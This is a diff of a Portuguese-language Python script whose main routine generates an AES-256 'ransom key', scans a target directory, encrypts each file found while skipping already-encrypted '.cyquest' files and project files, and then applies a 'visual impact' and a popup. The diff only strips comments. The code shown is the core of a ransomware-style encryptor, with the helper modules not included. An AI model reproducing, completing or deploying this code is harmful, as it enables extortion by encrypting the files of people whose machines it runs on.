@@ -5,16 +5,16 @@ import time
 from pathlib import Path
 import argparse
 
-# Importa os módulos necessários (devem estar no mesmo diretório)
+
 from varredura_de_arquivo import escanear_diretorio
 from criptografia import criptografar_arquivo
 from interface import injetar_impacto_visual, disparar_popup
 
-# Extensões que não serão criptografadas
+
 EXTENSOES_IGNORADAS = {
-    ".cyquest",   # já criptografado
-    ".key",       # chave
-    ".py",        # arquivos do projeto
+    ".cyquest",   
+    ".key",       
+    ".py",        
     ".exe",
     ".dll"
 }
@@ -44,13 +44,13 @@ def main():
 
     inicio = time.time()
 
-    # 1. Gerar chave AES-256
+
     chave_mestra = os.urandom(32)
     with open("chave_resgate.key", "wb") as key_file:
         key_file.write(chave_mestra)
     print("[+] Chave AES-256 gerada e salva em chave_resgate.key")
 
-    # 2. Varredura dos arquivos
+
     print("[*] Escaneando diretório...")
     arquivos_encontrados = escanear_diretorio(diretorio_alvo)
 
@@ -58,7 +58,7 @@ def main():
     total_criptografados = 0
     erros = 0
 
-    # 3. Criptografar cada arquivo
+
     for categoria, lista_paths in arquivos_encontrados.items():
         if not lista_paths:
             continue
@@ -76,12 +76,12 @@ def main():
                 print(f"[ERRO] {caminho.name}: {e}")
                 erros += 1
 
-    # 4. Impacto visual
+
     print("\n[*] Aplicando impacto visual...")
     injetar_impacto_visual(diretorio_alvo)
     disparar_popup()
 
-    # 5. Estatísticas
+
     print("\n" + "="*40)
     print(f"Total de arquivos encontrados: {total_encontrados}")
     print(f"Total criptografados: {total_criptografados}")
